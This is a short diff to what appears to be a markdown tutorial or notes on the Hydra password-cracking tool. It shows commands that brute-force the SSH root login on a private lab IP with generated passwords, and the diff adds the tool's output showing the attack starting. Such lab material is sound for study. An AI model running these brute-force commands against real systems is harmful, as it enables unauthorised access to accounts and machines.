@@ -59,3 +59,13 @@ hydra -l root -x 1:9:aA1 192.168.133.129 ssh
 ```bash
 hydra -V -l root -x 1:9:aA1 192.168.133.129 ssh
 ```
+output
+
+```bash
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-14 16:59:58
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 242234 login tries (l:1/p:242234), ~15140 tries per task
+[DATA] attacking ssh://192.168.133.129:22/
+```
